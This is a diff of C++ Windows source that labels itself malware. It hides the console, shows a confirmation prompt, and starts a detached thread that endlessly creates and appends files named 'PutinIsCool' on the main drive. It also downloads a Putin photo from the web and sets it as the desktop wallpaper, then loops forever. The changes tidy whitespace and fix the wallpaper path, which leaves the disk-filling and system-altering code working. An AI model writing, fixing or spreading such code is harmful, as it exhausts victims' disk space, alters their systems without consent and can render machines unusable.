@@ -41,12 +41,12 @@ private:
 	bool dirExists(const string& dirName_in) {
 		DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
 		if (ftyp == INVALID_FILE_ATTRIBUTES)
-			return false; 
+			return false;
 
 		if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
-			return true;  
+			return true;
 
-		return false;   
+		return false;
 	}
 public:
 	Functionality() {
@@ -55,7 +55,7 @@ public:
 		window = FindWindowA("ConsoleWindowClass", NULL);
 		ShowWindow(window, 0);
 	}
-	
+
 	int warning() {
 		result1 = MessageBoxA(NULL, "Are you sure you want to run this malware?", "Warning...", MB_YESNO | MB_ICONWARNING);
 
@@ -67,12 +67,12 @@ public:
 		}
 
 	}
-	
+
 	void forkbomb() {
 		int count = 1;
 		get_main_drive();
 
-		
+
 		while (true) {
 			string File_Name = "PutinIsCool";
 			string the_string(main_drive);
@@ -97,31 +97,33 @@ public:
 				AppendFile.close();
 			}
 			count++;
-		}	
+
+		}
 	}
 
 	void wallpaper_func() {
 		get_main_drive();
-		strcat(main_drive, "PutinImages");
-
+		string FolderName = "\\PutinImage";
 		string dup = main_drive;
+		dup.pop_back();
+		dup += FolderName;
 
 		if (!dirExists(dup)) {
-			CreateDirectoryA(main_drive, NULL);
+			CreateDirectoryA(dup.c_str(), NULL);
 		}
-		
-		
+
+
 		const char* imageUrl = "https://wegotthiscovered.com/wp-content/uploads/2022/12/vladimir-putin.jpg";
 
-		
+
 		std::string imagePath = dup + "\\vladimir-putin.jpg";
 
 		URLDownloadToFileA(NULL, imageUrl, imagePath.c_str(), 0, NULL);
 
+		const char* imagePathConst = imagePath.c_str();
 
-		
-		SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)imagePath.c_str(), SPIF_UPDATEINIFILE);
-	
+		SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*) imagePathConst, SPIF_UPDATEINIFILE);
+
 	}
 };
 
@@ -139,20 +141,18 @@ int main() {
 
 
 	Functionality Obj;
-	
+
 	if (Obj.warning() == 1) {
 		return 0;
-	} 
+	}
 	thread fork_thread(&Functionality::forkbomb, &Obj);
-	
+
 	fork_thread.detach();
 
 	Obj.wallpaper_func();
 
+	while (1) {}
 
-	while (1) {
-
-	}
 
 	return 0;
 }
